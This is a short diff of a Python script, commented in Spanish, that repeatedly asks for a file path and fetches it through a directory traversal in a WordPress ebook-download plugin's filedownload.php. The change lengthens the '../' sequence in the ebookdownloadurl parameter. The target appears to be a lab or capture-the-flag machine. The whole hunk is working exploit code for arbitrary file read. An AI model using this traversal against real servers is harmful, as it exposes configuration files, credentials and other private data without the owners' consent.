@@ -19,7 +19,7 @@ while True:
     # Verifica si se ingresó 'salir' para terminar el bucle
 
     # Construye la URL utilizando la ruta proporcionada
-    url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../{ruta}"
+    url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../{ruta}"
 
     try:
         # Realiza la petición a la URL
